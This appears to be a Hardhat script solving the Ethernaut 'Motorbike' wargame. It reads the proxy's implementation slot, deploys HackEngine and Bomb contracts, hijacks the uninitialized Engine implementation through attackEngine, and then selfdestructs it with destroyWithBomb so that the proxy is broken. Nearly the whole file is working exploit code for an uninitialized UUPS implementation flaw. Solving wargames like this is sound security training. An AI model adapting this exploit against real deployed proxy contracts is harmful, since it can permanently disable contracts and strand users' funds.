
const { ethers, waffle } = require("hardhat");

var CONTRACT_ADDRESS = "0x12ea70b6902973DB6312eA817B70e0C73882Fa22"; // get from browser console
const PLAYER_ADDRESS = "0x23618e81E3f5cdF7f54C3d65f7FBc0aBf5B21E8f"; // change to your own address

async function main() {

    const provider = waffle.provider
    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("Motorbike", CONTRACT_ADDRESS, signer)

    // check storage of contract motorbike(the proxy)
    const slot0 = await provider.getStorageAt(CONTRACT_ADDRESS, 0)
    console.log(`motorbike slot0 is ${slot0.toString()}`)
    const slot1 = await provider.getStorageAt(CONTRACT_ADDRESS, 1)
    console.log(`motorbike slot1 is ${slot1.toString()}`)

    const engineAddress = await provider.getStorageAt(CONTRACT_ADDRESS, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
    engineAddr = ethers.utils.getAddress(engineAddress.toString().substring(26, 66))  // be careful with the offset, 0x is counted.
    console.log(`engine address is ${engineAddr}`)
    const engine = await ethers.getContractAt("Engine", engineAddr, signer)
    console.log(`engine address is ${engine.address}`)

    //deploy our own contract Motorbike & Engine
    // const engineFactory = await ethers.getContractFactory("Engine")
    // const engine = await engineFactory.deploy()
    // await engine.deployed()
    // console.log(`engine address is ${engine.address}`)
    // const MotorFactory = await ethers.getContractFactory("Motorbike")
    // const motor = await MotorFactory.deploy(engine.address)
    // await motor.deployed()
    // CONTRACT_ADDRESS = motor.address


    // check storage of contract engine
    console.log('---------------------------------------')
    const eslot0 = await provider.getStorageAt(engine.address, 0)    // upgrader | _initializing | _initialized
    console.log(`engine slot0 is ${eslot0.toString()}`)
    const eslot1 = await provider.getStorageAt(engine.address, 1)   // horsepower
    console.log(`engine slot1 is ${eslot1.toString()}`)

    // deploy HackEngine
    console.log('deploy hackEngine ... ')
    const HackEngineFactory = await ethers.getContractFactory("HackEngine")
    const BombFactory = await ethers.getContractFactory("Bomb")
    const hackEngine = await HackEngineFactory.deploy(engine.address)
    console.log(`hackEngine address: ${hackEngine.address}`)
    await hackEngine.deployed()

    const original = await hackEngine.originalContract()
    console.log(`get original contract from hackEngine : ${original}`)

    const bomb = await BombFactory.deploy()
    await bomb.deployed()
    console.log(`bomb address is ${bomb.address}`)

    // call attackEngine 
    console.log('calling attackEngine ...')
    await hackEngine.attackEngine()

    const eeslot0 = await provider.getStorageAt(engine.address, 0)    // upgrader | _initializing | _initialized 
    console.log(`engine slot0 after attack is ${eeslot0.toString()}`)
    const upgrader = await engine.upgrader()
    console.log(`engine upgrader now : ${upgrader}`)
    const horsePower = await engine.horsePower()
    console.log(`engine horsepower now: ${horsePower}`)

    console.log('calling attackEngine again...')
    const hackEngine1 = await HackEngineFactory.deploy(engine.address)
    console.log(`new hackEngine address: ${hackEngine1.address}`)
    await hackEngine1.attackEngine()
    const upgrader1 = await engine.upgrader()
    console.log(`engine upgrader now : ${upgrader1}`)



    // call  destroyWithBomb
    console.log('calling destroyWithBomb ...')
    let tx = await hackEngine.destroyWithBomb()  // use hackEngine 1 will not destroy the contract
    await tx.wait()
    const newimplement = await provider.getStorageAt(CONTRACT_ADDRESS, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
    // console.log(engineAddress.toString())
    newAddr = ethers.utils.getAddress(newimplement.toString().substring(26, 66))
    console.log(`upgraded engine address is ${newAddr}`)


    console.log('calling validateItIsBroken ...')
    await hackEngine.validateItIsBroken()


}

main().catch((error) => {
    console.error(error);
    // eslint-disable-next-line no-process-exit
    process.exit(1);

});